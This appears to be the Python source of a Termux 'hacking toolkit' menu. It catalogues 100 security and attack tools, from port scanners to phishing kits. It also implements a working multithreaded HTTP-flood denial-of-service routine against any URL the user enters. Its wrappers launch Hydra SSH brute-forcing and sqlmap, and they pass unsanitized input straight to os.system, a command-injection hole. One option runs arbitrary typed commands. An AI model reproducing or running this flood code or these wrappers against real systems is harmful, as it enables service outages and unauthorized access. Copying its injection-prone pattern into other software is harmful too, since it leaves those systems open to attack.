import os, subprocess, socket, urllib.request, ssl, hashlib, base64, json, threading, time
from colorama import Fore

VERSION = "v1.0.9"
AUTHOR = "sunveroblox-bit"

TOOLS = {
    # 1-15: Reconnaissance & Network (Open Source CLI)
    1: ["Nmap Network & Port Scanner", 1], 2: ["Masscan High-Speed Port Scanner", 1], 3: ["Netcat TCP/UDP Swiss Army Knife", 1], 
    4: ["Tcpdump Packet Analyzer", 1], 5: ["Whois Domain Information", 6], 6: ["Dnsenum DNS Enumeration", 1], 
    7: ["TheHarvester OSINT Email & Domain Gatherer", 1], 8: ["DNSRecon DNS Reconnaissance", 1], 9: ["Netdiscover ARP Network Scanner", 1], 
    10: ["Arp-scan Local Subnet Discovery", 1], 11: ["Macchanger MAC Address Spoofing Utility", 1], 12: ["Traceroute Network Path Tracer", 1], 
    13: ["Curl Advanced HTTP Client", 1], 14: ["Wget Downloader & Mirror Utility", 1], 15: ["WhatWeb Technology Fingerprinter", 1],
    
    # 16-30: Cryptography & Hashes (Open Source CLI)
    16: ["John the Ripper Password Cracker", 2], 17: ["Hashcat Advanced Password Recovery", 2], 18: ["OpenSSL Encryption & Certificate Tool", 2], 
    19: ["GPG GNU Privacy Guard Utility", 2], 20: ["Base64 Encode / Decode CLI", 2], 21: ["Xxd Hex Dump Utility", 2], 
    22: ["Binwalk Firmware Analysis Tool", 2], 23: ["Exiftool Metadata Extractor", 2], 24: ["Steghide Steganography Tool", 2], 
    25: ["Strings Binary String Extractor", 2], 26: ["Certbot Let's Encrypt Client", 2], 27: ["Md5sum / Sha256sum Checksum Verifier", 2], 
    28: ["Python Cryptography CLI Helper", 2], 29: ["UUID Generator CLI", 30], 30: ["Gzip / Zip Compression Utility", 2],
    
    # 31-45: Web Analysis & OSINT (Open Source CLI)
    31: ["Dirsearch Web Path Brute-Forcer", 3], 32: ["Gobuster Directory/DNS Enumerator", 3], 33: ["Nikto Web Server Vulnerability Scanner", 3], 
    34: ["Sherlock Username Social Media OSINT", 3], 35: ["PhoneInfoga Phone Number OSINT Tool", 3], 36: ["Recon-ng Open Source Reconnaissance Framework", 3], 
    37: ["Sublist3r Subdomain Enumerator", 3], 38: ["Photon Crawler & OSINT Extractor", 3], 39: ["CMSeeK CMS Detection and Exploitation", 3], 
    40: ["WafW00f Web Application Firewall Detector", 3], 41: ["WPScan WordPress Vulnerability Scanner", 3], 42: ["BlackWidow Web Site Spider", 3], 
    43: ["SpiderFoot Automated OSINT Collector", 3], 44: ["CORS Scanner Utility", 3], 45: ["Httpie Modern HTTP Client CLI", 3],
    
    # 46-60: Attacking, DoS & Brute-Force (Includes Bayustore22 DoS & Open Source Tools)
    46: ["Bayustore22 Python DoS Framework (HTTP Flood)", 4], 47: ["Multi-Threaded HTTP DDoS Stress Tester", 4], 
    48: ["Thc-Hydra Login Brute-Forcer", 4], 49: ["Medusa Parallel Login Brute-Forcer", 4], 50: ["Metasploit Framework Console", 4], 
    51: ["Routersploit Router Exploitation Framework", 4], 52: ["Sqlmap SQL Injection Automation Tool", 4], 53: ["Commix Command Injection Exploiter", 4], 
    54: ["XSStrike Advanced XSS Detection Suite", 4], 55: ["Zphisher Automated Phishing Tool", 4], 56: ["Seeker Social Engineering Geolocation Tool", 4], 
    57: ["CamPhish Webcam Phishing Tool", 4], 58: ["BeEF Browser Exploitation Framework", 4], 59: ["Social-Engineer Toolkit (SET)", 4], 60: ["Aircrack-ng Wireless Security Suite", 4],
    
    # 61-75: System Diagnostics & Termux Utilities
    61: ["Htop Process Viewer", 5], 62: ["Neofetch System Information", 5], 63: ["Tmux Terminal Multiplexer", 5], 
    64: ["Screen Terminal Session Manager", 5], 65: ["Proot-Distro Linux Distribution Manager", 5], 66: ["Termux-API Device Integration", 5], 
    67: ["Git Version Control System", 5], 68: ["Python3 Pip Package Manager", 5], 69: ["Node.js JavaScript Runtime", 5], 
    70: ["Rclone Cloud Storage Sync", 5], 71: ["Tree Directory Structure Viewer", 5], 72: ["Nano Text Editor", 5], 
    73: ["Vim Advanced Text Editor", 5], 74: ["W3m Text-Based Web Browser", 5], 75: ["Termux Storage Setup Utility", 5],
    
    # 76-85: Vulnerability & Injection Testing
    76: ["NoSQLMap NoSQL Database Exploiter", 6], 77: ["SSRFmap Server-Side Request Forgery Tool", 6], 78: ["XXEinjector XML External Entity Tool", 6], 
    79: ["JWT-Tool JSON Web Token Security Suite", 6], 80: ["Log4j Vulnerability Scanner", 6], 81: ["DotDotPwn Path Traversal Fuzzer", 6], 
    82: ["CORS Misconfiguration Scanner", 6], 83: ["API Fuzzer CLI", 6], 84: ["WebDAV Exploitation Tool", 6], 85: ["Insecure Deserialization Payload Tester", 6],
    
    # 86-92: Cloud, API & Mobile Security
    87: ["Trivy Container & Infrastructure Scanner", 7], 88: ["CloudSploit Cloud Security Auditor", 7], 89: ["ScoutSuite Multi-Cloud Security Auditing", 7], 
    90: ["Kube-Hunter Kubernetes Penetration Tester", 7], 91: ["S3Scanner Amazon S3 Bucket Finder", 7], 92: ["TruffleHog Secret & Credential Scanner", 7],
    86: ["Postman Newman CLI API Runner", 7],
    
    # 93-100: Wireless, Forensics & Custom Open Source Runners
    93: ["Wifite Wireless Auditing Tool", 8], 94: ["Kismet Wireless Network Detector", 8], 95: ["Reaver WPS Attack Tool", 8], 
    96: ["Volatility Memory Forensics Framework", 8], 97: ["Autopsy Digital Forensics Suite", 8], 98: ["BleachBit System Cleaner", 8], 
    99: ["Termux Package Cleaner & Fixer", 8], 100: ["Custom Open Source Tool / Plugin Runner", 8]
}

attack_running = False
attack_counter = 0
counter_lock = threading.Lock()

def dos_worker(url):
    global attack_counter
    while attack_running:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ZeusKit-DoS/1.0"})
            urllib.request.urlopen(req, timeout=2)
            with counter_lock: attack_counter += 1
        except Exception: pass

def run_bayustore22_dos():
    global attack_running, attack_counter
    print(Fore.CYAN + "\n=== BAYUSTORE22 DOS FRAMEWORK (HTTP FLOOD) ===")
    target = input(Fore.YELLOW + "Enter Target URL (e.g. http://example.com): ").strip()
    if not target.startswith("http"): target = "https://" + target
    threads_count = int(input(Fore.YELLOW + "Enter number of threads [30]: ").strip() or 30)
    
    attack_counter = 0
    attack_running = True
    print(Fore.GREEN + f"[*] Launching DoS attack simulation against {target} with {threads_count} threads...")
    print(Fore.YELLOW + "[!] Press Ctrl+C to stop the attack.\n")
    
    for _ in range(threads_count):
        t = threading.Thread(target=dos_worker, args=(target,))
        t.daemon = True
        t.start()
        
    try:
        while True:
            with counter_lock:
                print(Fore.CYAN + f"\r[+] Requests Sent: {attack_counter}", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        attack_running = False
        print(Fore.RED + "\n[!] Attack stopped by user.")

def execute_tool(tool_id):
    name, cat = TOOLS[tool_id]
    print(Fore.GREEN + f"\n[+] Executing Tool #{tool_id}: {name}")
    try:
        if tool_id == 1:
            target = input(Fore.YELLOW + "Enter IP or Domain for Nmap: ").strip()
            os.system(f"nmap -F {target}")
        elif tool_id == 31:
            url = input(Fore.YELLOW + "Target URL for Dirsearch: ").strip()
            os.system(f"dirsearch -u {url}")
        elif tool_id == 46 or tool_id == 47:
            run_bayustore22_dos()
        elif tool_id == 48:
            target = input(Fore.YELLOW + "Target IP/Domain for Hydra: ").strip()
            os.system(f"hydra -l admin -P wordlist.txt {target} ssh")
        elif tool_id == 52:
            url = input(Fore.YELLOW + "Target URL with parameter for Sqlmap: ").strip()
            os.system(f"sqlmap -u '{url}' --batch")
        elif tool_id == 34:
            username = input(Fore.YELLOW + "Enter Username for Sherlock: ").strip()
            os.system(f"python3 -m sherlock {username}")
        elif tool_id == 35:
            phone = input(Fore.YELLOW + "Enter Phone Number for PhoneInfoga: ").strip()
            os.system(f"phoneinfoga scan -n {phone}")
        elif tool_id == 100:
            cmd = input(Fore.YELLOW + "Enter custom open-source tool command or script: ").strip()
            if cmd: os.system(cmd)
        else:
            print(Fore.YELLOW + f"[*] [{name}] wrapper invoked. Ensure package is installed in Termux (e.g., pkg install).")
    except Exception as e:
        print(Fore.RED + f"[!] Execution Error: {e}")
    input(Fore.YELLOW + "\nPress Enter to return...")
